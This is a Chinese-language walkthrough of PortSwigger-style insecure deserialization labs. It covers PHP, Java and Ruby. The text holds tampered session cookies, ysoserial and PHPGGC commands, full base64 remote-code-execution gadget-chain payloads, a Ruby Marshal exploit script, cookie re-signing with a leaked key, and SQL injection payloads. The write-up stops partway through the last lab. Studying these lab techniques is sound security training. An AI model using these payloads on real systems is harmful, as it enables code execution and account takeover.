[TOC]

#### 0. serialization sheet

##### 0-1. PHP serialization format

PHP使用一种人类可读的字符串格式，其中字母代表数据类型，数字代表每个条目的长度。For example, consider a `User` object with the attributes:

```
$user->name = "carlos";$user->isLoggedIn = true;
```

序列化之后的样子可能长这样：

```
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```

解释：

- `O:4:"User"` - An object with the 4-character class name `"User"`
- `2` - the object has 2 attributes
- `s:4:"name"` - The key of the first attribute is the 4-character **string** `"name"`
- `s:6:"carlos"` - The value of the first attribute is the 6-character **string** `"carlos"`
- `s:10:"isLoggedIn"` - The key of the second attribute is the 10-character **string** `"isLoggedIn"`
- `b:1` - The value of the second attribute is the **boolean** value `true`

The native methods for PHP serialization are `serialize()` and `unserialize()`. If you have source code access, you should start by looking for `unserialize()` anywhere in the code and investigating further.

除了`s`,`b`标识，还有`i`表示数字。

##### 0-2. Java serialization format

Some languages, such as Java, use **binary** serialization formats. This is more difficult to read, but you can still identify serialized data if you know how to recognize a few tell-tale signs. For example, serialized Java objects always **begin with the same bytes**, which are **encoded as `ac ed `in hexadecimal and `rO0` in Base64**.

Any class that implements the interface `java.io.Serializable` can be serialized and deserialized. If you have source code access, take note of any code that uses the `readObject()` method, which is used to read and deserialize data from an `InputStream`.

##### 0-3. magic method

魔术方法：

PHP：

```
__wakeup() //使用unserialize时触发
__sleep() //使用serialize时触发
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__construct() //当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。
__get() //用于从不可访问的属性读取数据
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当脚本尝试将对象调用为函数时触发
```

Java：

在java的反序列化时会调用`readObject()`方法，一般来说是调用系统的初始化字节流的`ObjectInputStream.readObject()`方法，但是可序列化的类也可以声明自己的`readObject()`方法去覆盖系统方法。

```java
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {...};
```

#### 1. Modifying serialized objects

>  To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos's account.

我在cookie中看到了这个

````
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%253d
````

经过两次url解码，一次base64解码，我得到了反序列化的结果。

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

这里观察到有一个`admin`的属性，值为`false`，尝试把这个改为`true`，看看能不能进入后台。

这里改成1之后，再base64编码，之后将等号两次url编码。

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%253d
```

然后发现了一个新的按钮`Admin panel`。

这里在进入admin的网页的时候，还需要再次更改cookie。

甚至在删除账户的时候，也需要更改cookie。

#### 2. Modifying serialized data types

> To solve the lab, edit the serialized object in the session cookie to access the `administrator` account. Then, delete Carlos.

这里将cookie解码（方式和上面一样）之后得到

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"jca90uvjbprg57m6ffmet62vx7q3n2ar";}
```

>  PHP will effectively convert the entire string to an integer value based on the initial number. The rest of the string is ignored completely. Therefore, `5 == "5 of something" `is in practice treated as `5 == 5`.
>
> This becomes even stranger when comparing a string the integer `0`:
>
> ```
> 0 == "Example string" // true
> ```

按照文章的说法，这里的`access_token`可以直接赋值为`0`。这里的是数字0，所以用`i`去标识数字。

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

然后进行一次base64编码，两次url编码即可，（这里没有特殊字符需要url编码）。

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```

#### 3. Using application functionality to exploit insecure deserialization

> To solve the lab, edit the serialized object in the session cookie and use it to delete the `morale.txt` file from Carlos's home directory.

这里解码出来是：

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"y9028bjjf4har6ox2yhy7jbxlt4pts93";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

这里有三个属性，是`username`，`access_token`和`avatar_link`。

这里推断删除账户的时候会同时删除头像的文件。尝试更改：

```
O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";i:0;s:11:"avatar_link";s:23:"users/carlos/morale.txt";}
```

编码之后是：

```
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6InVzZXJzL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
```

这里直接报错了，`access_token`不对。但是在报错里面却把三个账户的token给暴露出来了。

```
$access_tokens = [rvgfy7hqh61zxmnonr037f86jie45pzm, djihjerv3dukil9i0cnzcw9xzxtqetkp, y9028bjjf4har6ox2yhy7jbxlt4pts93]
```

这里登陆我们的后备账号去查看他的token，看看是不是在里面。

然后看到这个token是`djihjerv3dukil9i0cnzcw9xzxtqetkp`，发现正好在里面，那么说明第一个token:`rvgfy7hqh61zxmnonr037f86jie45pzm`应该就是carlos账号的了。

这里重新构造反序列化：

```
O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"rvgfy7hqh61zxmnonr037f86jie45pzm";s:11:"avatar_link";s:23:"users/carlos/morale.txt";}
```

编码之后：

```
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJydmdmeTdocWg2MXp4bW5vbnIwMzdmODZqaWU0NXB6bSI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6InVzZXJzL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
```

然后还是报错了，说没有读取权限。然后说有读取权限的是`/home/carlos/`，我到这里才发现我的home目录写错了。

```
O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"rvgfy7hqh61zxmnonr037f86jie45pzm";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

这次就过了。

这里写完了之后觉得不太对劲，心想着怎么就把token给爆出来了，然后去看了一下官方的解答。

然后官方的解答是：删除自己的账号，然后用自己的账号去删除carlos的文件。然后我这里才发现，这里题目并没有要求删除carlos的账号。我有问题。

#### 4. Arbitrary object injection in PHP

**要求：**

需要获得源代码阅读权限，然后从中找到漏洞，注入一个恶意的序列化对象，最后删除`carlos`主目录里面的`morye.txt`文件。

这里得到的是：

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kfpx738gjxxvyartnga0bdcw9ypaxavc";}
```

我们先尝试找到源代码：

尝试用`administrator`账户登陆。

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

然后报错，没有这个用户。

然后在浏览网页的时候发现了这条注释。

```html
<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
```

尝试直接访问`/libs/CustomTemplate.php`，发现没有报错，状态码正常，但是没有内容，应该是执行了php文件。找了很久，没有找到其他的漏洞。

这里使用了php的备份文件。[php备份格式](https://blog.csdn.net/xy_sunny/article/details/107633518)。

所以直接访问`/libs/CustomTemplate.php~`文件，拿到了php源码。

```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

在这个源码里面`CustomTemplate`类有了两个`__construct()`和`__destruct()`的魔术方法。

而且我们在`__destruct()`函数里面发现了删除文件的函数`unlink()`。

所以我们只需要给`lock_file_path`赋值就好了。

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

编码之后

```
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%25%33%64%25%33%64
```

这可以直接过。

#### 5. Exploiting Java deserialization with Apache Commons

> This lab uses a serialization-based session mechanism and loads the **Apache Commons Collections library**. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.
>
> To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.

```
rO0ABXNyACJkYXRhLnNlc3Npb24udG9rZW4uQWNjZXNzVG9rZW5Vc2Vyc1+hUBRJ0u8CAAJMAAthY2Nlc3NUb2tlbnQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACHVzZXJuYW1lcQB+AAF4cHQAIHBpYXR2NTlubXAyYXExdXl4dmFibXIxaGEwbGx4czg5dAAGd2llbmVy
```

这里是java的反序列化(开头是`rO0`)，用工具`ysoserial.jar`(其实是[`ysoserial-master.jar`](https://github.com/frohoff/ysoserial)，只不过被我改了名字)。

题目说了是用的`Commons Collections`，所以使用命令(在linux里面跑)

`java -jar ysoserial.jar CommonsCollections4 "rm -f /home/carlos/morale.txt" | base64`

获得结果并将其中的`+`进行url编码：

```
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB%2bAAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H%2bkhtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX%2bAYIVOACAAB4cAAABq3K/rq%2bAAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAdcm0gLWYgL2hvbWUvY2FybG9zL21vcmFsZS50eHQIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBABt5c29zZXJpYWwvUHduZXI4Mjk2NDEyNDczMjEBAB1MeXNvc2VyaWFsL1B3bmVyODI5NjQxMjQ3MzIxOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAAAAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAAAAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AHwAAAdTK/rq%2bAAAAMgAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAA8AA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIAFgAQAAlwdAAEUHducnB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHcEAAAAA3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABcQB%2bACl4
```

#### 6. Exploiting PHP deserialization with a pre-built gadget chain

> For PHP-based sites you can use "PHP Generic Gadget Chains" (**PHPGGC**).
>
> This lab has a serialization-based session mechanism that uses a signed cookie.
>
> To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the `morale.txt` file from Carlos's home directory.

```
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJlenp3NDU5a2c4bnp3aDdwYW9od3I1ODV1NGVsZnoweSI7fQ==","sig_hmac_sha1":"8bdd11ad368a4c4a6401fcd7b8a5641600702346"}
```

`token` 解码出来是:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ezzw459kg8nzwh7paohwr585u4elfz0y";}
```

这里有反序列化，之后的payload就应该放在里面。

`sig_hmac_sha1` -> 使用未知的密钥进行了一次`hmac_sha1`加密。

这里在旁边的网页源代码中发现了一个注释，给出了`phpinfo`。

进去看，在环境变量中找到了`SECRET_KEY`，用这个`SECRET_KEY`去加密base64编码的`token`，发现正好是后面那个哈希。

这里将加密函数给出（python）：[出处](https://blog.csdn.net/daiyudong2020/article/details/51817364)

```python
import hashlib
import hmac

# 进行加密 utf-8
def get_authorization(sk, msg):
    hashing = hmac.new(sk, msg, hashlib.sha1).hexdigest()
    return hashing


if __name__ == "__main__":

    # 秘钥
    sk = b"lbzdlnjag5euoa3ckv27w0eu31qzial0"

    # 需要加密的msg，自定义
    msg = b'''Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJjbzBsMXd1aWMya2xrZGw2bXR5N3JoM3BzNmc2cnlvbyI7fQ=='''
    print(get_authorization(sk, msg))
```

接下来就是要去找如何利用这个php的反序列化漏洞了。

去搜索[`PHPGGC`工具](https://github.com/ambionics/phpggc)。

这里随便先执行了一个：

```shell
./phpggc monolog/rce1 exec "rm /home/carlos/morale.txt" | base64
```

得到了base64编码的结果，然后加密，之后按照格式写出来，，最后进行一次url编码。

```
{"token"%3a"TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7TzoyOToiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIiOjc6e3M6MTA6IgAqAGhhbmRsZXIiO047czoxMzoiACoAYnVmZmVyU2l6ZSI7aTotMTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo0OiJleGVjIjt9fXM6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MjY6InJtIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0IjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19Cg%3d%3d","sig_hmac_sha1"%3a"d52fc91d9b3bb1180820ca401b7e7e2286a87b40"}
```

然后返回了信息：`Internal Server Error: Symfony Version: 4.3.6`

所以这里改变命令，之后的重复前面的操作就可以了。

```
./phpggc Symfony/RCE4 exec "rm /home/carlos/morale.txt" | base64
```

这里直接给出最终结果：

```
{"token"%3a"Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%3d%3d","sig_hmac_sha1"%3a"d706b71f19b760ad3e07370629dfef7baab7d99a"}
```

#### 7. Exploiting Ruby deserialization using a documented gadget chain

> To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory

这里用wiener登陆进去之后，发现cookie里有session，base64解码之后发现是一个反序列化之后的东西。

去搜了一下如何应用。

[Ruby 2.x gadget chain反序列化 RCE - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/3223)

```ruby
#!/usr/bin/env ruby

class Gem::StubSpecification
  def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|rm /home/carlos/morale.txt 1>&2")

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
  pipe.print payload
  pipe.close_write
  puts pipe.gets
  puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```

在kali里运行`ruby ./payload`，得到了base64的结果。然后进行url编码：

```
BAhVOhVHZW06OlJlcXVpcmVtZW50WwZvOhhHZW06OkRlcGVuZGVuY3lMaXN0BzoLQHNwZWNzWwdvOh5HZW06OlNvdXJjZTo6U3BlY2lmaWNGaWxlBjoKQHNwZWNvOhtHZW06OlN0dWJTcGVjaWZpY2F0aW9uBjoRQGxvYWRlZF9mcm9tSSIlfHJtIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0IDE%2bJjIGOgZFVG87CAA6EUBkZXZlbG9wbWVudEY%3d
```

将这个复制到session那里，直接发送。

#### 8. Developing a custom gadget chain for Java deserialization

> To solve the lab, gain access to the source code and use it to construct a gadget chain to obtain the administrator's password. Then, log in as the `administrator` and delete Carlos's account.

先是去阅读源代码：

```html
<!-- <a href=/backup/AccessTokenUser.java>Example user</a> -->
```

得到源代码`AccessTokenUser.java`：

```java
package data.session.token;

import java.io.Serializable;

public class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    public String getUsername()
    {
        return username;
    }

    public String getAccessToken()
    {
        return accessToken;
    }
}
```

在`/backup`目录下还能看到另一个文件`ProductTemplate.java`

```java
package data.productcatalog;

import common.db.ConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

这里可以看到`id`直接被放进了sql语句。

这里构造类：

```java
package data.productcatalog;

import java.io.Serializable;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;

    public ProductTemplate(String id)
    {
        this.id = id;
    }
    public String getId()
    {
        return id;
    }
}
```

然后用给的那个去序列化，将id改为`administrator'`，得到base64的结果，然后一次url编码放进burp。

```
rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQADmFkbWluaXN0cmF0b3In
```

然后返回了这个：`org.postgresql.util.PSQLException: ERROR: unterminated quoted string at or near &quot;&apos;administrator&apos;&apos; LIMIT 1&quot;`

sql语句报错。

说明这里有反序列化+SQL注入漏洞。

先检查列的数目，列的数目为8：

```
' order by 8 --
```

接着去找哪个列能用，然后发现第四列可以用。

```
' union select null,null,null,1,null,null,null,null --
```

接着就是去查表，看用户名密码在哪。

```
' union select null,null,null,cast(tablename as numeric),null,null,null,null from pg_tables --
```

报错说不能将`users`转换成数字。

